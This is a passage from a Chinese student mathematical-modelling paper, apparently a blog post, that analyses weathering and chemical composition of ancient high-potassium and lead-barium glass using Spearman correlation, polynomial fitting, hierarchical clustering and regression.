title="2.4对问题四的分析"></a>2.4对问题四的分析</h4><p>问题四属于相关性分析的问题类型，对于解决此类问题一般可以采用的分析方法包括多元线性回归模型，灰度分析等方法。</p><p>在问题一中，通过散点图和相关性分析可知，存在部分数据并不满足相关性，所以无法完全采用建立多元线性回归模型的方式完成分析，针对相关与不相关数据并存的情况，采用灰度关联分析的方式。求出相应的关联系数。</p><p>不同种类的玻璃其具有差异明显的化学成分关联关系，即具有对应关系系数，对关系系数进行排序，比较不同类别之间的化学成分关联关系的差异性。</p><h3 id="三、模型假设"><a href="#三、模型假设" class="headerlink" title="三、模型假设"></a>三、模型假设</h3><ol><li><p>附件表2中缺失数据部分，视为含量极小可以忽略不计；</p></li><li><p>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响；</p></li><li><p>不同类型玻璃，自身突出特性对其他化学成分的掩盖影响在划分亚类时应当剔除；</p></li><li><p>假设实验数据允许存在一定的误差范围；</p></li><li><p>假设在做对比实验时遵循控制变量法，控制其他实验条件完全相同；</p></li></ol><h3 id="四、符号说明及名词定义"><a href="#四、符号说明及名词定义" class="headerlink" title="四、符号说明及名词定义"></a>四、符号说明及名词定义</h3><table><thead><tr><th>符号</th><th>定义</th><th>单位</th></tr></thead><tbody><tr><td><img src=".\国赛数学建模\1.jpg" style="zoom:80%;" /></td><td>斯皮尔曼系数</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C2.jpg"></td><td>等级差</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C3.jpg"></td><td>多项式阶数</td><td>阶</td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C4.jpg"></td><td>比例系数</td><td></td></tr><tr><td>ρ</td><td>分辨系数</td><td></td></tr><tr><td>S</td><td>总轮廓系数</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C5.jpg"></td><td>关联度系数列表</td><td></td></tr></tbody></table><h3 id="五、模型的建立与求解"><a href="#五、模型的建立与求解" class="headerlink" title="五、模型的建立与求解"></a>五、模型的建立与求解</h3><h4 id="5-1问题一的求解与分析"><a href="#5-1问题一的求解与分析" class="headerlink" title="5.1问题一的求解与分析"></a>5.1问题一的求解与分析</h4><h5 id="5-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#5-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="5.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>5.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>**Step1.**表单1数据可视化</p><p>为了对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析，我们首先对表单里的数据进行可视化，使用Python的matplotlib分别展示表面风化与玻璃类型、纹饰和颜色的数量关系条形图。其中，表单1的58个数据中，有3个铅钡风化玻璃的数据它的颜色变量是没有数据的，由于风化后的化学成分变化是不确定的，并且使用完整的55个数据进行可视化分析对表面风化与颜色的关系猜测影响很小，故在该步骤下删去。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps7.jpg"  /></center><center>图5-1 是否风化与玻璃种类的数量关系</center><img src=".\国赛数学建模\wps8.jpg"  /> <center>图5-2 是否与风化与玻璃纹饰的数量关系</center>![](.\国赛数学建模\wps9.jpg)![](.\国赛数学建模\wps10.jpg) <center>图5-3 是否风化与玻璃颜色数量关系</center>由折线图可知，铅钡玻璃数量较多，高钾玻璃数量较少。风化的铅钡玻璃数量较少，占比低，整体保存较好；而风化的高钾玻璃数量较多，占比高。其中，未风化的高钾玻璃只有蓝绿A纹玻璃和蓝绿B纹玻璃，高钾玻璃受风化影响较大。<p>**Step2.**斯皮尔曼系数关联性分析</p><p>我们根据条形图的数量关系可以猜测表面风化与玻璃类型间的关系最大，与颜色和纹饰间的关系很小。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，与表单1所给的定类变量而不是连续变量不符合。故我们选择利用斯皮尔曼系数，将定序数据划分等级0或1（风化或未风化，高钾或铅钡）、1<del>8（玻璃颜色）和1</del>3（玻璃纹饰）表示，运用公式（5-1）进行表面风化与玻璃类型、纹饰和颜色的关联性分析得出斯皮尔曼系数<img src=".\国赛数学建模\1.jpg" style="zoom:80%;" />。设X，Y为两组数据，其中X为自变量X=(x1, x2, x3)=(类型，纹饰，颜色)，Y为因变量是否表面风化，其斯皮尔曼（等级）相关系数：</p><img src=".\国赛数学建模\wps11.jpg"  /> <p>其中，<img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5Cwps15.jpg">为<img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5Cwps16.jpg">和之间的等级差。</p><p>使用SPASS软件，计算斯皮尔曼相关系数，分析各变量与表面风化的关系。呈现结果如下表所示：</p><p>表5-1 斯皮尔曼系数</p><table><thead><tr><th>因变量</th><th>相关系数</th><th>表面风化</th></tr></thead><tbody><tr><td>类型</td><td>相关系数</td><td>0.037</td></tr><tr><td>Sig.(双尾)</td><td>0.781</td><td></td></tr><tr><td>纹饰</td><td>相关系数</td><td>0.344</td></tr><tr><td>Sig.(双尾)</td><td>0.008</td><td></td></tr><tr><td>颜色</td><td>相关系数</td><td>-0.107</td></tr><tr><td>Sig.(双尾)</td><td>0.442</td><td></td></tr></tbody></table><p>通过表格可见，斯皮尔曼相关系数<img src=".\国赛数学建模\1.jpg" style="zoom:80%;" /></p>  ，位于-1和1之间，应用正确。记玻璃纹饰A、B、C为1、2、3。分析得玻璃纹饰与表面风化成正相关（斯皮尔曼相关系数大于0）。从玻璃纹饰角度考虑风化的概率C&gt;B&gt;A，显著性大于0.05说明玻璃纹饰与表面风化的相关性不显著。记高钾玻璃为1，铅钡玻璃为2。分析得玻璃类型与表面风化成正相关（斯皮尔曼相关系数大于0）且其相关性在0.01级别（双尾），相关性显著。从玻璃类型角度考虑风化的概率铅钡玻璃大于高钾玻璃。对蓝绿、浅蓝、紫、深绿、深蓝、浅绿、绿、黑色玻璃编号为1~8，根据斯皮尔曼相关性分析得玻璃颜色与表面风化成负相关，显著性在0.4级别，说明相关性不显著。从颜色角度讲风化概率蓝绿&lt;浅蓝&lt;紫&lt;深绿&lt;深蓝&lt;浅绿&lt;绿&lt;黑色玻璃。</p><p>综上，表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大。在接下来问题分析中，需要将玻璃类型考虑在内。</p><h5 id="5-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#5-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="5.1.2文物样品表面有无风化化学成分含量的统计规律"></a>5.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>**Step1.**表单2数据可视化</p><p>为了探究出文物样品表面有无风化化学成分含量的统计规律，我们统计出趋势、中位数、方差等。对数据进行均值比较和方差分析，根据结果使用Python进行数据可视化处理，画出无风化高钾玻璃和铅钡玻璃的化学成分比较折线图、高钾玻璃风化前后对比折线图和铅钡玻璃风化前后对比折线图进行观察。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps19.jpg" style="zoom: 67%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps20.jpg" style="zoom: 67%;" /></center><center>图5-4高钾玻璃风化前后对比折线图（加SiO2和不加SiO2）</center>高钾玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，因为风化导致除二氧化硅以外化学成分比例都降低（氧化钠和氧化钾降低较明显）使二氧化硅有些升高外，整体变化稳定。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps25.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps26.jpg" style="zoom:80%;" /></center><center>图5-5铅钡玻璃风化前后对比折线图（加二氧化硅和不加二氧化硅）</center>铅钡玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，除了因为风化导致部分化学成分降低使氧化铝和二氧化硅有明显升高外，其他元素比例变化稳定。<p>综上，风化前和风化后的化学成分比例整体变化一致，我们可以针对变化明显的化学成分进行分析找到倍数关系。</p><p>**Step2.**表单2数据处理</p><p>根据题目内容可知表单2给出的相应的主要成分所占比例累加和介于 85%<del>105%之间的数据视为有效数据。通过Excel求和公式，计算出69个文物采样点的主要成分所占比例累加和。其中文物采样点15累加和为79.47%和文物采样点17累加和为71.89%，二者不在85%</del>105%之间，故剔除数据。</p><p>通过对表单2的数据分类整理可知，高钾玻璃都不含有氧化锡，可以在高钾玻璃中不考虑该化学成分。同时，风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，无法寻找风化前和风化后的联系，化学成分预测上宜通过未风化中的化学成分规律。并且使用SPSS工具进行聚类分析，同样会优先将其中一种单独聚为一类，我们由此认定在该项聚类中，这部分数据没有意义，舍弃进行进一步聚类。</p><p>通过对风化前与风化后化学元素变化折线图5-5和5-6可知，铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变，可以认为风化前与风化后比例没有变化，在接下来分析中不做考虑。</p><p>对高钾玻璃和铅钡玻璃的剩余化学成分进行聚类分析，使用SPASS软件分析出化学成分集合分组，即由类似对象组成多个类的结果。处理结果如图5-4和图5-5所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps27.png" style="zoom:67%;" /> </center><center>图5-6高钾玻璃各化学成分聚类谱系图</center>分析高钾玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅作为第一类，氯化钾和氧化钙作为第二类，将氧化镁、氧化铝、氧化铁以及五氧化二磷作为第三类，将氧化铜作为第四类，从而实现数据的降维。将聚类结果和高钾玻璃统计规律的结果进行相互检验发现相符合。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps28.jpg" style="zoom:67%;" /> </center><center>图5-7铅钡玻璃各化学成分聚类谱系图</center>分析铅钡玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅、氧化钠以及氧化铁作为第一类，氧化钙、氧化铅、氧化锡及二氧化硫作为第二类，将氧化镁作为第三类，将氧化二磷作为第四类，从而实现数据的降维。将聚类结果和铅钡玻璃统计规律进行相互检验发现相符合。<h5 id="5-1-3预测风化点在风化前的化学成分含量"><a href="#5-1-3预测风化点在风化前的化学成分含量" class="headerlink" title="5.1.3预测风化点在风化前的化学成分含量"></a>5.1.3预测风化点在风化前的化学成分含量</h5><p>**Step1.**高钾玻璃风化前的化学成分含量预测</p><p>根据相关性分析（分析结果见附录），二氧化硅和其他变量间都是强相关性，可以以二氧化硅为因变量，其他化学成分为自变量，对高钾玻璃的散点图进行曲线拟合。我们选择多项式曲线拟合进行少量数据的情况下拟合出比较好的曲线，原理如下：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps29.jpg" style="zoom: 80%;" /></center> 其中M是多项式的阶数（最高次数），<img src=".\国赛数学建模\wps30.jpg" style="zoom:80%;" />是多项式的系数，记作W。<p>使用python软件的sklearn库和matplotlib库生成拟合图，如图5-4所示（文中仅展示部分代表，拟合发现同一类化学成分的曲线趋势基本相同）。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps31.jpg" style="zoom:80%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps32.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps33.jpg" style="zoom:80%;" /></center><center>图5-8二氧化硅与其他化学成分的曲线拟合（高钾玻璃）</center>接下来我们还要求出W，建立对应拟合曲线的拟合函数，求出二氧化硅和其他7个化学成分的W值。如下表5-2所示。<center>表5-2二氧化硅和其他7个化学成分的W值</center>| 因变量     |                              W                               || ---------- | :----------------------------------------------------------: || 氧化钾     | [9.35606172e-06 -2.57806774e-03 2.53723140e-01 -1.06974030e+01 1.75202587e+02] || 氧化铝     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铜     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铁     | [2.65598539e-05 -8.49958292e-03 1.00819891e+00 -5.25574184e+01 1.01817760e+03] || 氧化钙     | [-2.66096268e-05 8.24388435e-03 -9.44132282e-01 4.71535967e+01 -8.58821425e+02] || 五氧化二铅 | [1.54677974e-05 -4.92447555e-03 5.80303071e-01 -2.99966231e+01 5.74887003e+02] || 氧化镁     | [2.51296158e-05 -7.72761458e-03 8.82922501e-01 -4.44354852e+01 8.32682964e+02] |<p>最后，对高钾玻璃中风化点在风化前的化学成分含量进行预测（W值在实际使用时小数点取前四位）。</p><p>对于前面分析中高钾玻璃采样点都不含有氧化锡所以该部分选择不填值。风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，它们的化学含量占比小且最大差值小于2，我们可以用平均值表示这五个元素的化学含量。</p><center>表5-3化学成分比例平均值</center>| 化学成分 | 氧化钠 | 氧化铅 | 氧化钡 | 氧化锡 | 二氧化硫 || -------- | ------ | ------ | ------ | ------ | -------- || 平均值   | 2.7800 | 0.6420 | 1.7950 | 0.0975 | 0.4067   |<p>对于二氧化硅的未风化预测，根据前面分析，我们可以用一个比例系数K 来通过风化值求出未风化的值，利用统计规律求解出比例系数K=0.7280。</p><p>对于剩下的七个化学成分我们通过拟合出来的函数进行求解。最终未风化前的化学成分含量预测结果如下表5-4所示。</p><center>表5-4高钾玻璃中风化点在风化前的化学成分含量的预测结果</center>|        | SiO2    | Na2O   | K2O     | CaO     | MgO    | Al2O3  | Fe2O3  | CuO    | PbO    | BaO   | P2O5   | SrO    | SnO2 | SO2    || ------ | ------- | ------ | ------- | ------- | ------ | ------ | ------ | ------ | ------ | ----- | ------ | ------ | ---- | ------ || **7**  | 65.7673 | 2.7800 | 10.0032 | 11.5770 |        | 6.5340 | 1.6490 | 3.2400 | 0.6420 | 1.795 | 1.4701 | 0.0975 |      | 0.4067 || **9**  | 67.5920 | 2.7800 | 9.5951  | 4.2222  |        | 4.3560 | 3.1040 | 1.5500 | 0.6420 | 1.795 | 0.8435 | 0.0975 |      | 0.4067 || **1**  | 68.7067 | 2.7800 | 9.3013  | 1.4301  |        | 2.6730 | 2.5220 | 0.8400 | 0.6420 | 1.795 | 0.0000 | 0.0975 |      | 0.4067 || **12** | 66.9459 | 2.7800 | 9.7500  | 4.9032  |        | 4.8180 | 2.8130 | 1.6500 | 0.6420 | 1.795 | 0.3615 | 0.0975 |      | 0.4067 || **22** | 65.5685 | 2.7800 | 10.0422 | 11.3046 | 1.6400 | 11.550 | 3.3950 | 0.5500 | 0.6420 | 1.795 | 0.5061 | 0.0975 |      | 0.4067 || **27** | 65.8312 | 2.7800 | 9.9904  | 6.4014  | 1.5400 | 8.2830 | 1.9400 | 1.5400 | 0.6420 | 1.795 | 0.8676 | 0.0975 |      | 0.4067 |<p> **Step2.**铅钡玻璃风化前的化学成分含量预测</p><p>使用python软件的sklearn库和matplotlib库生成拟合曲线图，如图5-5所示：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps34.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps35.jpg" style="zoom:80%;" /></center><center>图5-9二氧化硅与其他化学成分的曲线拟合（铅钡玻璃）</center>通过图像可知，铅钡玻璃的散点图分布情况和高钾玻璃的散点图分布情况不一样，点在整张图上随机分布，故不能通过二氧化硅和其他化学成分拟合出合适的曲线进而得到拟合函数预测出铅钡玻璃风化前的化学成分含量。<p>根据上面聚类分析并结合表单2的统计学规律将铅钡玻璃所有变量划分为4个类，将其设为<img src=".\国赛数学建模\wps36.jpg" style="zoom:67%;" />。将铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变的4个变量的累加和设为定值<img src=".\国赛数学建模\wps37.jpg" style="zoom:67%;" />。根据统计学规律计算出的系数设为<img src=".\国赛数学建模\wps38.jpg" style="zoom:67%;" /> </p><p>建立模型为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps39.jpg" style="zoom:100%;" /> </center><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps40.jpg" style="zoom:100%;" /> </center>将统计学规律计算出的系数<img src=".\国赛数学建模\wps41.jpg" style="zoom:80%;" />加入模型得：<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps42.jpg" style="zoom:100%;" /> </center>将铅钡玻璃的数据放入模型，最终未风化前的化学成分含量预测结果如下表5-5所示。<center>表5-5铅钡玻璃中风化点在风化前的化学成分含量的预测结果（部分）</center>|        | **SiO2** | **Na2O** | **K2O** | **CaO** | **MgO** | **Al2O3** | **Fe2O3** | **CuO** | **PbO** | **BaO** | **P2O5** | **SrO** | **SO2** || ------ | -------- | -------- | ------- | ------- | ------- | --------- | --------- | ------- | ------- | ------- | -------- | ------- | ------- || **2**  | 58.3986  |          | 1.5000  | 1.3343  | 0.9569  | 5.7300    | 3.8874    | 0.2600  | 27.8253 |         | 0.6645   | 0.1900  |         || **8**  | 59.6931  |          |         | 0.8437  |         | 1.3400    |           | 1.4100  | 16.3763 | 17.8323 | 0.6642   | 0.3700  | 1.4732  || **8**  | 62.6751  |          |         | 1.8186  |         | 1.1100    |           | 3.1400  | 18.5289 | 2.6720  | 1.3986   | 0.5300  | 8.7363  || **11** | 64.6478  |          | 0.2100  | 2.1510  | 0.5758  | 2.6900    |           | 4.9300  | 14.4977 | 8.3423  | 1.7353   | 0.3700  |         || **19** | 58.6627  |          |         | 1.67393 | 0.4784  | 3.5700    | 2.7797    | 3.5100  | 24.4522 | 3.5485  | 1.6336   | 0.1900  |         || **26** | 59.4844  |          |         | 0.82944 |         | 0.7000    |           | 1.5700  | 16.8616 | 18.4148 | 0.5795   | 0.4500  | 1.1192  |<h4 id="5-2问题二的求解与分析"><a href="#5-2问题二的求解与分析" class="headerlink" title="5.2问题二的求解与分析"></a>5.2问题二的求解与分析</h4><h5 id="5-2-1高钾玻璃、铅钡玻璃的分类规律"><a href="#5-2-1高钾玻璃、铅钡玻璃的分类规律" class="headerlink" title="5.2.1高钾玻璃、铅钡玻璃的分类规律"></a>5.2.1高钾玻璃、铅钡玻璃的分类规律</h5><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps43.jpg" style="zoom:80%;" /> </center><center>图5-10 无风化高钾玻璃和铅钡玻璃的化学成分比较折线图</center>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响。<p>通过表单2中的数据分析风化前高钾玻璃和铅钡玻璃各化学成分含量并计算出均值。由上图均值比对可得出如下规律：高钾玻璃氧化钾的含量远高于铅钡玻璃，铅钡玻璃氧化铅和氧化钡的含量远高于高钾玻璃，以化学成分含量为依据而将其分为高钾玻璃和铅钡玻璃，分类标准合理。</p><h5 id="5-2-2-数据预处理"><a href="#5-2-2-数据预处理" class="headerlink" title="5.2.2 数据预处理"></a>5.2.2 数据预处理</h5><p>在进行分类之前先进行数据的预处理。</p><p>玻璃的主要原料是石英砂，主要化学成分是二氧化硅（SiO2），所以二氧化硅这一化学成分的存在是古代玻璃所具有的共性，故将二氧化硅这一化学成分不作为分类依据。另外，针对不同类型的玻璃在分类时考虑自身突出特性对其他化学成分的掩盖影响应当剔除，由此铅钡玻璃在进行内部分类时，氧化铅和氧化钡不作为分类依据。同理，高钾玻璃在进行亚分类时氧化钾不作为分类依据。</p><p>数据来源上，将附件中表单2原始数据处理为高钾未风化、高钾风化、铅钡风化、铅钡无风化四种类型。根据假设条件，玻璃的分类是在完整未经风化状态下进行的，故而不考虑风化后的玻璃样本而将着眼点放在风化前的各样本数据上，这其中也包括了表面风化但局部未风化的样本即含有未风化点的样本，如23、25、28、29号文物等。经过数据剔除，最终考虑的样本数量状态为：无风化高钾玻璃12个样本，无风化铅钡玻璃23个样本。接下来对这些样本进行亚类划分。</p><h5 id="5-2-3-亚类划分"><a href="#5-2-3-亚类划分" class="headerlink" title="5.2.3 亚类划分"></a>5.2.3 亚类划分</h5><p>本文通过SPSS软件，采用系统聚类模型分别针对高钾和铅钡玻璃进行亚分类。</p><p>系统聚类分析将各样品各看成一类，然后计算类与类之间的距离，选择距离最小的一对合并为新类，计算新类与其他各类的距离，再将距离最近的两类合并，这样依次迭代，直到所有样品合为一类为之，由此实现不同样本之间的聚类。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps44.jpg" style="zoom:100%;" /> </center><center>图5-11 聚类分析基本思想</center>在确定要分类的数量时，本文采用肘部法则，用聚合系数折线图估计聚类的数量。聚合系数折线图的横纵坐标分别为聚类类别数K和聚合系数J。运用SPSS系统聚类分析可以得到聚合系数J，之后借助excel将系数降序排列，做出散点折线图，分析变化趋势。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps45.jpg" style="zoom:100%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps46.jpg" style="zoom:100%;" /></center><center>&nbsp&nbsp&nbsp&nbsp&nbsp图5-12 高钾玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp 图5-13铅钡玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</center>由折线变化趋势可得高钾玻璃在聚类别数为3时下降趋势渐缓，故判定高钾玻璃最佳聚类数为3，同理，判定铅钡玻璃最佳聚类数为6。<p>另外，在亚类划分时要考虑适合的化学成分，意即在划分完成后仍需进一步分析系统聚类结果中化学成分的内在联系，由此，在聚类完成后加入主观统计学分析，以系统聚类分析的结果为基础，与均值的比对为指引，寻找同一类样本之间化学成分上的联系，进而总结出规律，必要时可以重新组合类。</p><p>下面首先进行系统聚类分析：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps47.jpg" style="zoom:80%;" /> </center><center>图5-14 高钾玻璃12个样本的谱系图</center>表中纵轴以Casen的形式显示代表原表单中样本的排列顺序，以下分类中为方便表示直接使用数字n代表某样本。<center>表5-6 高钾玻璃文物采样点与序号的对应关系</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 01   | 03.1 | 03.2 | 04   | 0    | 06.1 | 06.2 | 13   | 14   | 16   | 21   | 18   |<center>表5-7 铅钡玻璃文物采样点与序号对应关系（部分）</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   | …    || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 20   | 24   | 30.1 | 30.2 | 31   | 32   | 33   | 35   | 37   | 45   | 46   | 47   | …    |<p>注：03.1代表03部位1；03.2代表03部位2；30.1代表30部位1；30.2代表30部位2；</p><p>结合上图聚类结果将12个样本分为3类，分类结果如下： </p><center>表5-8 高钾玻璃初步聚类分析</center>| 类别  | 样本                || ----- | ------------------- || 类别1 | 1 2 3 4 5 8 9 10 11 || 类别2 | 6 7                 || 类别3 | 12                  |<p>之后进行统计学分析，观察各类之中有无化学成分含量突出或远高于均值的，抽象出分类标准。经过化学成分分析统计，比对得出高钾的三种分类标准：低铅钡、高磷、高铜。</p><center>表 5-9 高钾玻璃亚分类结果</center>| 类别            | 样本              || --------------- | ----------------- || 类别1（低铅钡） | 1 2 4 5 8 9 10 12 || 类别2（高磷）   | 6 7               || 类别3（高铜）   | 3 11              |<p> 同理，对于铅钡玻璃进行如下划分。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps48.jpg" style="zoom: 67%;" /> </center><center>图5-15 铅钡玻璃23个样品聚类情况</center>结合上图分类结果，将23个样本分为6类。<center>表 5-10 铅钡玻璃初步聚类分析</center>| 类别  | 样本                                    || ----- | --------------------------------------- || 类别1 | 1、21 、22                              || 类别2 | 12 、14 、18 、19                       || 类别3 | 6 、7 、8 、10 、11 、13、 15 、16、 23 || 类别4 | 4 、5                                   || 类别5 | 17 、20                                 || 类别6 | 2 、3、 9                               |<p>而后通过excel分析聚类中各化学成分含量，与均值进行比较得出5种分类标准：高磷、高钠、高铝、钙铁、高铜。</p><center>表5-11 铅钡玻璃亚分类结果</center>| 类别          | 样本                                    || ------------- | --------------------------------------- || 类别1（高磷） | 1 、21 、22                             || 类别2（高钠） | 12、 14 、18 、19 、13、 15             || 类别3（高铝） | 6、 7、 8 、10 、11 、16、 23 、17 、20 || 类别4（钙铁） | 3 、4、 5                               || 类别5（高铜） | 2 、9                                   |<h5 id="5-2-4合理性和敏感性检验"><a href="#5-2-4合理性和敏感性检验" class="headerlink" title="5.2.4合理性和敏感性检验"></a>5.2.4合理性和敏感性检验</h5><p>本文使用轮廓系数进行合理性检验，遍历簇数，计算对应轮廓系数，选择轮廓系数最大时对应的聚类模型。</p><p>单一轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps49.jpg" style="zoom:100%;" /> </center>其中a(i)表示i所属簇内其他样本的平均距离，b(i)表示i与其他簇的样本平均距离的最小值[3]。<p>聚类总体轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps50.jpg" style="zoom:100%;" /> </center>总轮廓系数S越接近1说明聚类越合理。<p>敏感性分析上，将具有典型化学成分含量特征的样本加入数据集，再次进行聚类分析，观测聚类结果是否与预料当中相同。本文中将问题一中预测的风化前的数据加入到高钾风化前、铅钡风化前的表单中进行聚类分析。分析是否与预期一致。</p><h4 id="5-3问题三的求解与分析"><a href="#5-3问题三的求解与分析" class="headerlink" title="5.3问题三的求解与分析"></a>5.3问题三的求解与分析</h4><h5 id="5-3-1鉴别未知类别玻璃文物所属类型"><a href="#5-3-1鉴别未知类别玻璃文物所属类型" class="headerlink" title="5.3.1鉴别未知类别玻璃文物所属类型"></a>5.3.1鉴别未知类别玻璃文物所属类型</h5><p>观察表单3所给出的未知类别玻璃文物数据发现，每条数据分为文物编号、表面风化和化学成分3个变量，我们判别玻璃文物类型前可以先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，然后再次对表单2的数据规律按照风化和无风化进行总结，找到合适作为自变量的化学成分，通过给予的未知类别玻璃文物数据和后期回归方程模型的建立计算出的预测结果，根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃。最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p><strong>Step1</strong> 表单2数据规律分析</p><p>在建立多元回归方程模型的时候发现，14个化学成分的比例分布不平衡，如果按照将显著性最大的二氧化硅作为因变量之一，来建立多元回归模型的话会导致影响因变量的自变量只有二氧化硅甚至使用的自变量皆无意义，无法将其余13个化学成分的比例价值凸显出来，进而能准确利用结果进行未知类别玻璃文物所属类型的鉴别。所以我们转而对表单2的数据间统计规律进一步深究，使用能显著代表文物类型且非二氧化硅的化学成分。</p><p>首先对于表单2的数据我们先划分为风化和无风化两个大类，在其中又分四小类分别是无风化高钾玻璃、无风化铅钡玻璃、无风化铅钡玻璃和风化铅钡玻璃。通过Python软件的matplotlib库画出箱图展现每一个小类中一维变量的统计规律。如下图5-16所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps51.png" style="zoom:100%;" /> </center><center>图5-16未风化高钾玻璃的箱图</center>箱图最大有点不受异常值的影响，它可以用一种相对稳定的方式描述数据的离散分布情况。箱图共有七大组成部分：上线、上四分位数、中位数、下四分位数、下线、四分位距离以及异常值。<p>之后根据箱图展现的统计规律和散点图展现的分布情况，进行以鉴别玻璃类型为目的数据整理，如下表5-12所示。</p><center>表5-12数据规律统计表（部分）</center>| 表面风化 |   类型    |      氧化钠       |        氧化钾         |      氧化钙       |                         |          氧化铝          || :------: | :-------: | :---------------: | :-------------------: | :---------------: | :---------------------: | :----------------------: ||   风化   | 高钾玻璃  |        无         |       0.59~1.01       | 0.21~1.07Max:1.66 |        0.54~0.64        |         0.81~3.5         || 铅钡玻璃 | 0.8~2.22  |     0.14~0.4      | 0.37~3.58Max:5.18,6.4 |     0.47~1.54     |   0.45~5.73Max:13.65    |                          ||  无风化  | 高钾玻璃  |     2.1~3.38      |      5.19~14.52       | 5.41~8.7Min:2.01  |        0.52~1.98        | 3.05~6.19Max:10.05,11.15 || 铅钡玻璃 | 0.92~3.38 | 0.11~0.35Max:0.71 |       0.38~2.98       |     0.51~1.67     | 1.44~6.5Max:14.34,12.69 |                          |<p>通过表5-12可知，高钾玻璃和铅钡玻璃的部分相同化学成分的变化范围是不相交的且存在明显的差异，我们可以在使用模型前直接判断出它的类型。同时可以将数据分类：第一类数据变化范围大，数值大可以考虑作为因变量，如未风化高钾的氧化铅和氧化钡；第二类数据整体波动适中，只出现几个较大值或较小值，可以考虑作为因变量或自变量，如氧化铜、氧化铁和氧化铝；第三类数据波动小且整体数值也小，还具有可以判别文物类型的特点，一般将其作为自变量，计算出的结果可以尽可能在表5-x的范围内，如未风化高钾的氧化锶。</p><p><strong>Step1</strong> 2多元回归模型求取文物所属类别</p><p>多元回归模型基本形式为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps52.jpg" style="zoom:100%;" /> 